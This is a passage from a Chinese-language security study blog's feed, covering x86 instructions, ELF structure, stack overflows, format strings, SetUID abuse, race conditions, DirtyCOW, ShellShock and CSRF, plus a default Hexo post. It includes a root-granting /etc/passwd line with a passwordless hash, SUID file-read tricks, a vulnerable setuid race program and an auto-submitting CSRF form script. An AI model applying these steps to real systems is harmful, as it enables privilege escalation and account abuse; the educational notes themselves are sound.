指令，主要用于函数过程，call 指令作用和 jmp 类似，都是无条件跳转，但是在跳转之前会将下一条指令的地址入栈，以配合 ret 指令返回。ret 指令在返回时不修正栈顶，如果遇到需要被调函数自己平衡栈的情况，可以用 <code>ret imm</code> 指令来修正栈顶后返回。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,1<br>push eax<br>call func<br>; ...<br>func:<br>add eax,2<br>ret 4<br></code></pre></td></tr></table></figure><p><code>loop</code> 指令，循环控制操作，现在已很少使用。通过 ecx 保存需要循环的次数，每次循环开始时 ecx 自动减一，当 ecx 为 0 时结束循环。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0<br>mov ecx,5<br>A:<br>add eax,ecx<br>loop A<br></code></pre></td></tr></table></figure><h3 id="串操作"><a href="#串操作" class="headerlink" title="串操作"></a>串操作</h3><p><code>movsb</code> &#x2F; <code>movsw</code> &#x2F; <code>movsd</code> &#x2F; <code>movsq</code> 指令，串传送指令，不同的后缀表示单次传送数据的大小。在使用时通常会先设置 DF 标志，表示传送的方向，并把 esi 指向的内存单元的值传送到 edi 指向的内存单元中去，执行后根据 DF 标志和宽度，esi 和 edi 会自动增加或减少相应的大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov esi,00403000h<br>mov edi,00403010h<br>cld<br>movsb<br>std<br>movsb<br></code></pre></td></tr></table></figure><p><code>stosb</code> &#x2F; <code>stosw</code> &#x2F; <code>stosd</code> &#x2F; <code>stosq</code> 指令，将 al &#x2F; ax &#x2F; eax &#x2F; rax 的值存储到 edi 指向的内存单元。在使用时通常会先设置 DF 标志，表示传送的方向，执行后根据 DF 标志和宽度，esi 和 edi 会自动增加或减少相应的大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,1<br>mov edi,00403000h<br>stosb<br>mov eax,2<br>stdsd<br>std<br>mov rax,3<br>stdsq<br></code></pre></td></tr></table></figure><p><code>rep</code> 重复前缀指令，movs 和 stos 指令都只能执行一次操作，要重复执行则需要使用 rep 前缀。每次开始执行时，ecx 的值会自动减 1，当 ecx 不为 0 时会重复执行，为 0 时自动结束。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov esi,00401000h<br>mov edi,00401010h<br>mov ecx,4<br>cld<br>rep movsd<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Binary Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ELF文件结构</title>
    <link href="/2022/07/01/ELF-file-structure/"/>
    <url>/2022/07/01/ELF-file-structure/</url>
    
    <content type="html"><![CDATA[<h1 id="ELF文件结构分析"><a href="#ELF文件结构分析" class="headerlink" title="ELF文件结构分析"></a>ELF文件结构分析</h1><p>ELF文件包括linux下的可执行文件，共享链接库等等。ELF文件的结构可以有两个平行的视角，一个是链接的视角，一个是装载的视角。</p><p>从链接视角来看，ELF文件被分成了不同的节区（Section），每一个节区用来存放不同的数据，比如.text段一般用来存放指令&#x2F;代码，.data用来存放已初始化的静态变量，.rodata用来存放只读变量（const），.bss用来存放未初始化的静态变量，.got用来存放全局偏移，包括全局变量的偏移和全局函数地址的偏移（调用外部函数时，通过这个偏移来找到真正的函数地址），.plt存放一段代码，启用lazy binding时，第一次调用外部函数会将具体的库进行装载，并且确定偏移至got表中，plt负责调用读取got中的偏移并进行跳转。</p><img src="/2022/07/01/ELF-file-structure/SHT.png" class="" title="Sections"><p>从装载视角来看，程序其实并不需要进行像Segment这样细粒度的分类也可以执行。所以程序头表（program header table）定义了一些Segment，不同的segment拥有不同的读写执行权限，拥有相同权限的section可能会被放在同一个segment中。在装载的时候，系统还需要进行页对齐，比如进行0x1000的补全。</p><img src="/2022/07/01/ELF-file-structure/PHT.png" class="" title="Segments">]]></content>
    
    
    
    <tags>
      
      <tag>Binary Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Binary vulnerabilities</title>
    <link href="/2022/06/28/binarySecurity/"/>
    <url>/2022/06/28/binarySecurity/</url>
    
    <content type="html"><![CDATA[<h3 id="栈溢出漏洞"><a href="#栈溢出漏洞" class="headerlink" title="栈溢出漏洞"></a>栈溢出漏洞</h3><p>在低级语言中使用一些内存操作函数（如<code>gets</code> , <code>scanf</code>, <code>vscanf</code>, <code>strcat</code>, <code>strcpy</code>, <code>sprintf</code>, <code>bcopy</code>）操作栈（非动态申请）中的内存时，有可能会因为对函数的误用或者没有做长度校验而使操作的内存空间超出所申请的buffer的范围，从而对本身不应被读写的内存被误读写。他可能会导致栈中的变量被读取或者修改。数据被读取有可能造成机密性被破坏，密钥，密码等等被泄漏（例如心脏滴血漏洞）。数据被修改可能导致校验被绕过（如果攻击者修改了校验位）。而最重要的，因为栈中会保存这个函数返回的地址信息，当这个地址数据被修改时，程序的控制流会被劫持，也就是PC指针会指向一个攻击者指定的地方，从而执行任意指令。</p><h4 id="攻防博弈"><a href="#攻防博弈" class="headerlink" title="攻防博弈"></a>攻防博弈</h4><p>攻击：</p><ol><li>（Ret2Shellcode）攻击者在栈里面布置一段shellcode（原意是可以开启一个shell的代码，其实可以是任意恶意代码的机器码），并修改返回地址，让其指向这段shellcode的开头，当函数执行结束时，会跳转到这段代码开始执行，从而实现RCE（任意代码执行）。这个攻击的条件是，要保证函数返回前，被覆盖的栈中内存不会导致程序崩溃（要顺利执行到函数返回的地方）。</li></ol><p>防御：</p><ol><li>针对攻击1。栈随机化（ASLR：Address space layout randomization）。就是每一次运行相同的程序，他的栈的base位置是随机的，这将导致攻击者无法确定其放在栈里面的shellcode的位置（不知道返回地址那一栏该写什么）。其实ASLR有三个等级。等级为0时，完全没有随机。为1时，将mmap基址、栈随机化，从而库地址、vdso页面也会被随机化。等级为2时，堆也会被随机化。</li><li>针对攻击1。金丝雀值（CANARY）。就是在栈中的变量和返回地址之间放一个随机值，每次函数调用都会产生一个新的随机值，当函数返回时，要检查一下这个值是不是正确。由于攻击者不知道CANARY值，所以没法伪造，系统可以通过这个值来确定栈是不是被破坏过。如果CANARY值不对，就不返回了，会跳到异常处理部分，而攻击者的代码也不会被执行。在linux中，会提示stack smashing detected，并且终止程序。</li><li>针对攻击1。栈不可执行（NX: Non-executable Stack）。栈里面应该存放的都是数据，正常的流程下，PC指针是不会跳到栈里面去执行的。所以当PC进入栈区时，NX会被触发而中断攻击流程，会触发segmentation fault。这个特性在编译的时候可以通过一个选项开启，在ELF文件中的program header中的一个域被声明。</li></ol><p>攻击：</p><ol start="2"><li>针对防御1。ASLR不会将代码段进行随机，所以可以尝试跳转到代码段（ret2text）（内存中任何没有被随机化的地方），利用已有的代码完成一些恶意操作。</li><li>针对防御1。利用别的地方泄漏装载地址&#x2F;栈基址。</li><li>针对防御1。如果没有开启NX的话，并且如果我们可以覆盖很长一段栈空间，那我们可以在shellcode前面先写很长一段废指令，比如nop。如果返回地址命中了这个长长的滑动窗口，那最终会执行到我们的shellcode。这样做可以增加命中的概率。</li><li>针对防御1。不直接覆盖返回地址，而是利用可以控制的栈中存放的数据来完成对返回地址的修改。这个需要看从溢出到返回之间有没有可以通过修改数据来影响到返回地址&#x2F;栈指针的操作。具体情况要具体分析。</li><li>针对防御2。通过别的函数泄漏canary值。</li><li>针对防御2。数组指针越界型可以只修改返回地址，不需要连续覆盖。</li><li>针对防御2。当系统检测到canary值被修改时，会调用stack_check_fail函数，阻断程序继续执行，如果我们可以想办法劫持这个函数指针(劫持GOT表)，从而执行我们所指定的函数&#x2F;shellcode。</li><li>针对防御3。可以尝试到堆区执行。或者可以跳转到代码区&#x2F;装载的共享库区执行代码(Ret2libc)，在栈中布置好函数所需要的参数和以及返回地址等等。</li><li>针对防御3。ROP(Return-Oriented Programming)。就是在栈中布置一些地址。这些地址对应的代码片段gadget都是以ret结束的，所以多个这样的片段可能可以满足图灵完备性，例如libc里面的代码段，这样可以实现跳转至任何函数并传入对应的参数。</li><li>针对防御1。在32位的程序中，栈随机化有19bits的熵，所以栈的base共有2^19&#x3D;524,288种可能性，所以可以尝试暴力枚举方法。64位程序的栈随机化将会更难使用暴力枚举方法攻破。</li></ol><p>防御：</p><ol start="4"><li>针对攻击2。开启PIE以后，代码段和数据段的地址也会被随机化。</li><li>针对攻击8。开启完全RELRO，在程序启动时就绑定所有动态符号，GOT不可写。</li></ol><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p>一些函数在做输出的时候会用到格式化字符串，这个串规定了输出的格式等等。如果这个串可以被用户控制，那么恶意的用户可以通过构造这个串实现任意地址读取以及任意地址写入任意值。可以产生格式化字符串漏洞的函数有这些。</p><img src="/2022/06/28/binarySecurity/fmtStr.png" class="" title="危险函数"><p>这个漏洞的原理是，这些函数会维护一个参数指针，每遇到一个<code>%</code>，函数就会将这个指针向下移动并且将指针指向的内容解释为百分号所指定的格式。但是如果我们可以控制格式化字符串的话，我们就相当于可以控制这个指针，从而造成越界的读写。</p><p>例如，我们可以通过向格式化字符串中写入很多 <code>%s</code> 来使得程序崩溃，因为函数会将参数指针指向的内容解释为一个地址，而寻找这个地址指向的字符串。当栈中的内容不是一个地址的时候就会造成段错误。</p><p>我们还可以通过<code>%x</code>  <code>%p</code>，等等来以16进制&#x2F;指针的格式来打印出当前栈上的内容。</p><p>我们可以使用<code>%n</code> 来对指针指向的地址进行写入，写入的值是已经打印出的字符长度数。例如，我们可以覆盖函数返回值从而劫持控制流。并且我们可以通过控制输出的位数（<code>%.12345x</code>）来实现写入任意值。也可以通过指定参数位置来避免输出过多内容如（<code>%2$.08x</code>）表明输出的是第二个参数，我们可以这样来随意移动参数指针。</p><p>要注意的是，如果想要实现任意地址写入，那我们需要在栈上布置好我们要写入的内存地址，这样可以让格式化函数的参数指针移动到这个地址处进行写入。</p><h3 id="环境变量和SetUid程序"><a href="#环境变量和SetUid程序" class="headerlink" title="环境变量和SetUid程序"></a>环境变量和SetUid程序</h3><h4 id="环境变量的传递："><a href="#环境变量的传递：" class="headerlink" title="环境变量的传递："></a>环境变量的传递：</h4><ol><li>如果用 <code>fork</code> 函数创建一个子进程，那么父进程的环境变量会被子进程继承，只有在运行的进程名一项不同。</li><li>如果使用 <code>execve</code> 函数来运行一个新的程序，需要通过第三个参数来吧环境变量传递进去，否则新的程序不会继承原程序的环境变量。</li><li>如果使用 <code>system</code> 函数运行一个新的程序，在system函数的内部调用了 <code>execl</code> 和 <code>execve</code> 从而将当前程序的环境变量传递给了要执行的程序 <code>/bin/sh</code> ，进一步再通过 <code>fork</code> 传递至要运行的新程序中。</li></ol><h4 id="SetUID机制"><a href="#SetUID机制" class="headerlink" title="SetUID机制"></a>SetUID机制</h4><p>当一个程序的所有者是root时，普通用户去运行这个程序，这个程序也拥有root的运行权限，这可以帮助普通用户完成一些需要root权限的操作（例如访问&#x2F;etc&#x2F;passwd文件去修改密码），这些SetUID程序的逻辑都是规定好的，用户没有办法修改。但是用户可以通过修改环境变量来间接影响这些程序的行为。</p><ol><li><p>使用普通用户设置的环境变量，例如PATH，或者自定义的环境变量，运行SetUid程序时会被继承。但是LD_LIBARARY_PATH这类环境变量不会被继承。</p></li><li><p>当一个SetUid程序中使用了 <code>system</code> 函数来运行别的程序时，环境变量会被传入。&#x2F;bin&#x2F;sh会在PATH环境变量中按顺序寻找对应的可执行文件。以 <code>ls</code> 为例，如果我们在PATH前部加入自定义的路径，并且在这个路径下放名为 <code>ls</code> 的程序，那么我们的ls程序就会被执行。例如，我们将如下代码编译为ls程序，放在我们自定义的目录下。我们去调用一个执行 <code>system(&quot;ls&quot;)</code> 的SetUid程序时，由于我们将当前路径放到了PATH前面，所以我们的ls程序会被执行，并且通过运行时的输出我们可以发现euid为0，即以root权限执行。这个方法可以用来在已经获得shell的情况下提权。</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">if</span>(geteuid() == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;run as root, euid:%ld\n&quot;</span>, (<span class="hljs-type">long</span>)geteuid());<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;not run as root, euid:%ld\n&quot;</span>, (<span class="hljs-type">long</span>)geteuid());<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>LD_PRELOAD（用来指定用户定义的一些so库），或者LD_LIBRARY_PATH（用来指定一些标准库）这些环境变量会影响加载器&#x2F;链接器的行为。例如，我们在myprog.c里面调用sleep函数，再写一个自己的库mylib封装一个恶意的sleep函数。并使用普通用户把LD_PRELOAD修改为mylib这个库。<ol><li>myprog为非SetUid程序，普通用户调用，恶意函数被执行（说明LD_PRELOAD被继承）。（环境变量+文件上传&#x3D;任意代码执行）</li><li>myprog为SetUid程序，普通用户调用，恶意函数没有被执行（标准库中的sleep被执行）（说明LD_PRELOAD没有被继承）。</li><li>myprog为SetUid程序，使用root修改环境变量LD_PRELOAD，root用户执行，恶意函数被执行（root下有LD_PRELOAD这个变量）。普通用户执行，恶意函数没有被执行。（root下的环境变量+文件上传&#x3D;root下的任意代码执行）</li></ol></li><li>在SetUid程序中使用 <code>system</code> 函数，有可能因为命令注入导致特权命令被执行。<code>execve</code> 函数会防止命令注入。</li><li>在SetUid程序中，其完成一些特权操作以后，会回到正常用户模式，但是在特权模式下申请的一些资源可能还没有释放，回到正常用户态以后仍然可以利用这些已经申请的资源完成特权操作。</li><li>一些程序，如果他们被设置了SUID位，那么他们将拥有特权权限，我们可以利用这些程序来读取被保护的文件。例如： <code>cat</code>, <code>vim/vi/emacs</code>, <code>less/more</code>, <code>head/tail</code>, <code>gzip/zip/tar/ar/cpio</code>, <code>base32/base64</code>, <code>split/sort</code>, <code>od/xxd</code>等等。实际上有非常多的命令可以被用来读取文件。</li></ol><h3 id="竞争条件"><a href="#竞争条件" class="headerlink" title="竞争条件"></a>竞争条件</h3><ol><li>通过给&#x2F;etc&#x2F;passwd文件追加一行内容，可以实现创建一个root用户，从而获得root权限。可以添加 <code>root:x:0:0:root:/root:/bin/bash</code> 这一行。其中第一个位置为用户名称，root权限并不取决于用户的名称叫root，而是第三个位置的用户ID为0。第二个位置是密码，如果是x，那么密码就被存放在&#x2F;etc&#x2F;shadow文件中。我们也可以直接把密码的哈希值直接放在这里，这样就不用再去修改shadow文件了。我们可以添加这一行内容。 <code>test:U6aMy0wojraho:0:0:test:/root:/bin/bash</code> 其中这个hash值是ubuntu系统中的一个magic value，不需要输入密码，直接回车就可以登陆。如果不是ubuntu系统，我们可以通过adduser命令增加一个用户，再去查看shadow中对应的值来获取密码的hash值。</li><li>一个典型的竞态条件漏洞是，在一个SetUid程序中，先校验用户的真实ID，查看其是否有对文件的读写权限，然后对文件进行读写，代码如下：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>   <span class="hljs-type">char</span> * fn = <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>;<br>   <span class="hljs-type">char</span> buffer[<span class="hljs-number">60</span>];<br>   FILE *fp;<br>   <span class="hljs-comment">/* get user input */</span><br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%50s&quot;</span>, buffer );<br><span class="hljs-keyword">if</span>(!access(fn, W_OK))&#123; <br>    <span class="hljs-comment">// *** context switch</span><br>fp = fopen(fn, <span class="hljs-string">&quot;a+&quot;</span>);  <br>    fwrite(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">1</span>, fp);<br>fwrite(buffer, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-built_in">strlen</span>(buffer), fp);<br>fclose(fp);<br>  &#125;<br>   <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No permission \n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果context switch发生在***处，此时另外一个程序将&#x2F;tmp&#x2F;XYZ symlink到了&#x2F;etc&#x2F;passwd，那么就会对passwd文件进行读写，造成权限泄漏。</p><p>（是不是所有SetUid程序中先校验，再对文件（因为可以创造软链接）的操作都存在可能的竞态条件漏洞？）（不过也取决于这个校验是什么样子的，是否可以通过控制文件来使得程序通过校验）</p><p>linux中的符号链接和硬链接：</p><p>符号链接类似于快捷方式，是创建一个文本文件，这个文本中包含了真正的文件的位置等信息，当访问这个文本文件时，操作系统会转而访问真正的目标文件。硬链接是指两个文件虽然有不同的文件名，但是都指向硬盘上面的同一块区域，这两个文件具有相同的inode编号。</p><h3 id="DirtyCOW漏洞"><a href="#DirtyCOW漏洞" class="headerlink" title="DirtyCOW漏洞"></a>DirtyCOW漏洞</h3><p>DirtyCOW漏洞是linux内核中竞态条件漏洞的一个实例，攻击者可以利用这个漏洞获取root权限。当一个普通用户对某一个文件只有读权限时，其可以访问 <code>/proc/self/mem</code> 文件并调用 <code>write</code> 函数对内存进行写入，但是在write内部会判断，如果当前用户拥有只读权限，那么会在内存中进行一次拷贝，所有写的内容会写在新创建的这部分内存中，从而对原文件没有任何影响。在当前的拷贝后的内存不再被使用时，<code>madvice</code> 系统调用会建议操作系统内核删除这份拷贝，并将文件指针指向原来的内存。</p><p>所以 <code>write</code> 的执行顺序是：</p><ol><li>查看权限，如果是只读的话，就对映射的文件内存创建一份拷贝</li><li>修改页表，使得文件指针指向这份拷贝</li><li>写入内存</li></ol><p>但是123步骤并不是原子化的，如果在步骤23之间执行了 <code>madvice</code> 系统调用，那么文件指针就会指向原来的内存，造成越权写入。我们可以创建两个进程，一个进程在循环执行 <code>write</code> 系统调用，另一个在循环执行 <code>madvice</code> 系统调用，那么就可以使用普通用户的身份对 <code>/etc/passwd</code> 文件进行写入，从而获取root权限。</p><p>（和上一章的竞态条件漏洞来比，这个漏洞的问题同样也出在校验后，操作前。<code>write</code> 对用户的权限进行了校验，认为需要创建一份单独的拷贝并将指针指向了拷贝内存，但是 <code>madvice</code> 又让指针指了回去，<code>madvice</code> 的作用和创建软链接的过程有点类似。）</p><h3 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h3><p>原理是bash在解析父进程传递来的环境变量时，会将以 <code>() &#123; </code> 开头的变量解析成为一个函数。如果这个函数定义的后面有跟随一条指令的话，那么这条指令会被执行。有点类似于命令注入（把数据当作了代码并且执行）。受影响的bash版本为4.2.0(1)。常见于使用CGI来处理请求的web服务器上。因为服务器程序接受到输入以后，可能会将一些HTTP头设置为环境变量，然后调用cgi，cgi可能会使用bash脚本来完成任务。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Binary Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRF vulnerability</title>
    <link href="/2022/04/17/CSRF/"/>
    <url>/2022/04/17/CSRF/</url>
    
    <content type="html"><![CDATA[<h2 id="跨域请求伪造（XSRF-x2F-CSRF-Cross-Site-Request-Forgery）"><a href="#跨域请求伪造（XSRF-x2F-CSRF-Cross-Site-Request-Forgery）" class="headerlink" title="跨域请求伪造（XSRF&#x2F;CSRF: Cross-Site Request Forgery）"></a>跨域请求伪造（XSRF&#x2F;CSRF: Cross-Site Request Forgery）</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>与之前介绍的XSS漏洞不同，想要触发CSRF漏洞，需要两个条件。第一，用户已经登陆一个受信任的网站，例如<code>http://www.a.com</code>，并生成了cookie并且这个认证没有过期（并不一定需要打开这个tag页，有一些cookie并不是关闭页面以后立即过期的）。第二，需要攻击者诱导用户点击一个恶意的链接，例如 <code>http://www.b.com</code>。这个链接的网站归攻击者所有，所以，当用户点击这个链接时，攻击者设计好的网页上的脚本会被执行。而攻击者则可以在b网页上伪造一次请求发送a网站。此时，由于该请求是发送至a网站的，浏览器会将a网站的cookie附加在这次请求中，从而使得请求成功。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：<strong>简单的身份验证只能保证请求是发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</strong>。</p><h3 id="漏洞利用方法"><a href="#漏洞利用方法" class="headerlink" title="漏洞利用方法"></a>漏洞利用方法</h3><ol><li>伪造GET请求。在恶意的页面中嵌入img标签，构造参数对目标网站发起请求。</li><li>伪造POST请求。在恶意的页面中提交一个form请求。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">forge_post</span>(<span class="hljs-params"></span>)<br>&#123;<br>  <span class="hljs-keyword">var</span> fields;<br>  <span class="hljs-comment">// The following are form entries need to be filled out by attackers.</span><br>  <span class="hljs-comment">// The entries are made hidden, so the victim won’t be able to see them.</span><br>  fields += <span class="hljs-string">&quot;&lt;input type=’hidden’ name=’name’ value=’****’&gt;&quot;</span>;<br>  fields += <span class="hljs-string">&quot;&lt;input type=’hidden’ name=’briefdescription’ value=’****’&gt;&quot;</span>;<br>  fields += <span class="hljs-string">&quot;&lt;input type=’hidden’ name=’accesslevel[briefdescription]’ value=’2’&gt;&quot;</span>;<br>  fields += <span class="hljs-string">&quot;&lt;input type=’hidden’ name=’guid’ value=’****’&gt;&quot;</span>;<br>  <span class="hljs-comment">// Create a &lt;form&gt; element.</span><br>  <span class="hljs-keyword">var</span> p = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;form&quot;</span>);<br>  <span class="hljs-comment">// Construct the form</span><br>  p.<span class="hljs-property">action</span> = <span class="hljs-string">&quot;http://www.example.com&quot;</span>;<br>  p.<span class="hljs-property">innerHTML</span> = fields;<br>  p.<span class="hljs-property">method</span> = <span class="hljs-string">&quot;post&quot;</span>;<br>  <span class="hljs-comment">// Append the form to the current page.</span><br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(p);<br>  <span class="hljs-comment">// Submit the form</span><br>  p.<span class="hljs-title function_">submit</span>();<br>&#125;<br><span class="hljs-comment">// Invoke forge_post() after the page is loaded.</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-title function_">forge_post</span>();&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ol><li><p>验证码</p><p>观察CSRF的攻击过程实际上就是在用户不知情的情况下发送了请求，而验证码可以强制要求与用户进行交互，所以可以在请求时要求用户输入验证码。但从用户体验角度出发，如果所有请求都添加验证码，也是不现实的。</p></li><li><p>Referer Check</p><p>也就是发送请求时要求Header中带有当前发起请求的页面url。如果发送的不是当前网站的域，那么很有可能是遭遇了CSRF攻击。但是其完全依赖于浏览器发送正确的referer，如果有浏览器的漏洞可以影响到这个字段，那么这种防御机制就会失效。并且一些浏览器出于隐私保护的考虑，限制了referer的发送。<br>虽然不能完全防御CSRF，但是Referer Check可以作为监控CSRF发生的一种手段，是防御的一个充分条件。</p></li><li><p>Secret Token</p><p>当用户发送请求时，服务器端应用将令牌（token）嵌入HTML表格，并发送给客户端。客户端提交HTML表格时候，会将令牌发送到服务端，令牌的验证是由服务端实行的。令牌可以通过任何方式生成，只要确保随机性和唯一性（如：使用随机种子的哈希链 ）。这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。而浏览器的同源策略则限制了恶意网页访问令牌的能力。</p></li></ol><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol><li><a href="https://seedsecuritylabs.org/">SEED Labs</a>.</li><li>Web Security: A white hat perspective, Hanqing Wu.</li><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0">Wikipedia</a>.</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Web Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/04/16/hello-world/"/>
    <url>/2022/04/16/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS vulnerability</title>
    <link href="/2022/04/15/XSS/"/>
    <url>/2022/04/15/XSS/</url>
    
